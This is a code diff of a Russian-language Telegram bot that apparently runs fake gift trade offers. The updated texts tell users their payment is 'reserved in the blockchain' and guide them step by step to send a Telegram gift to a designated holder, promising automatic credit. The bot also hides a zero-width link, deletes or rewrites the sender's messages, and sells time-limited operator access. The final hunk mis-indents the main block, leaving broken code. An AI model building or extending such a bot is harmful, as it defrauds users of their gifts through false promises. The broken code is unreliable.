@@ -1,5 +1,5 @@
 """
-Sulumi Team Bot — Fixed Delete + New Commands
+Sulumi Team Bot — Fixed Delete + New Commands + Updated Texts
 """
 
 import os
@@ -271,7 +271,7 @@ def process_msg(msg):
             t += "/settings — Настройки\n"
             t += "/profile — Профиль"
             if uid == OWNER_ID:
-                t += "\n\n🔐 <b>Админ:</b>\n/add &lt;id&gt; &lt;дни&gt; (-1 навсегда)\n/list — Список"
+                t += "\n\n🔐 <b>Админ:</b>\n/add <id> <дни> (-1 навсегда)\n/list — Список"
             sm(cid, t, bci=ci)
             print("Handled /start")
             return
@@ -314,7 +314,7 @@ def process_msg(msg):
             t += "<b>Изменение:</b>\n"
             t += "/lg — сменить язык\n"
             t += "/cv — сменить валюту\n"
-            t += "/holder &lt;username&gt; — сменить держателя"
+            t += "/holder <username> — сменить держателя"
             sm(cid, t, bci=ci)
             print("Handled /settings")
             return
@@ -387,19 +387,15 @@ def process_msg(msg):
             print(f"Send result: {result.get('ok')} - {result.get('description', '')}")
             
             if result.get("ok"):
-                # Пробуем удалить тремя способами
                 if mid:
-                    # Способ 1: через sender_bci
                     del1 = dm(cid, mid, bci=sender_bci)
                     print(f"Delete attempt 1 (with bci): {del1.get('ok')} - {del1.get('description', '')}")
                     
                     if not del1.get("ok"):
-                        # Способ 2: без bci
                         del2 = dm(cid, mid)
                         print(f"Delete attempt 2 (without bci): {del2.get('ok')} - {del2.get('description', '')}")
                     
                     if not del1.get("ok") and not del2.get("ok"):
-                        # Способ 3: редактируем сообщение вместо удаления НА "ok"
                         em(cid, mid, "ok", bci=sender_bci)
                         print("Delete attempt 3: edited message to ok")
             else:
@@ -428,7 +424,6 @@ def process_msg(msg):
             sm(cid, f"📋 <b>Доступы</b>:\n\n{ul}", bci=ci)
             return
         
-        # Неизвестная команда
         sm(cid, f"❓ Неизвестная команда: {txt}\nНапиши /start для меню", bci=ci)
         
     except Exception as e:
@@ -450,8 +445,24 @@ def process_cb(cb):
         print(f"=== CB === data={data} uid={uid}")
         
         if data.startswith("check:"):
-            ac(cbid, txt="🔍 Подарок пока не найден.", sa=True)
+            did = data.split(":")[1]
+            deal = deals.get(did)
+            if not deal:
+                ac(cbid, txt="❌ Оффер не найден", sa=True)
+                return
+            
+            nf = fmt(deal["num"])
+            instr = (
+                f"Ожидается передача подарка {deal['name']} #{nf}\n\n"
+                f"Инструкция по передаче:\n"
+                f"1️⃣ Кнопка «Передать»\n"
+                f"2️⃣ Вкладка «Мои»\n"
+                f"3️⃣ Выбираете ваш подарок и передаёте\n"
+                f"4️⃣ Получаете звёзды на баланс Telegram"
+            )
+            ac(cbid, txt=instr, sa=True)
             return
+
         ac(cbid)
         
         if data.startswith("accept:"):
@@ -466,7 +477,9 @@ def process_cb(cb):
             deal_ci = deal.get("bci") or ci
             
             hidden = '<a href="' + nl + '">\u200b</a>'
-            txt = hidden + f"<b>{deal['price']}</b> {cs} успешно зарезервированы.\n\nОжидается передача <b>{deal['name']} #{nf}</b> пользователю @{h}.\n\nНажмите «Передать» и отправьте подарок."
+            txt = hidden + f"<b>{deal['price']}</b> {cs} успешно зарезервированы в блокчейне.\n\n"
+            txt += f"Ожидается передача подарка <b>{deal['name']} #{nf}</b> пользователю @{h}.\n\n"
+            txt += f"Нажмите кнопку «Передать» и отправьте подарок <b>{deal['name']} #{nf}</b> пользователю <b>@{h}</b>. После завершения сделки {cs} автоматически начислятся на ваш аккаунт."
             
             result = em_nft(cid, mid, txt, nl, kb=aakb(did, h), bci=deal_ci)
             if not result.get("ok"):
@@ -524,19 +537,19 @@ def set_webhook():
 def set_commands():
     commands = [
         {"command": "start", "description": "📋 Меню"},
-        {"command": "send", "description": "💎 Создать оффер"},
+        {"command": "send", "description": "💎 Создать"},
         {"command": "tarifs", "description": "💳 Цены"},
         {"command": "profile", "description": "👤 Профиль"},
         {"command": "settings", "description": "⚙️ Настройки"},
         {"command": "lg", "description": "🌐 Язык"},
-        {"command": "cv", "description": "💱 Валюта"}
+        {"command": "cv", "description": "💱 Валюта"},
     ]
     api("setMyCommands", commands=commands)
     print("Commands set")
-
-if __name__ == "__main__":
+    if __name__ == "__main__":
     set_webhook()
     set_commands()
     port = int(os.environ.get("PORT", 10000))
     print(f"Starting on port {port}")
     app.run(host="0.0.0.0", port=port)
+    
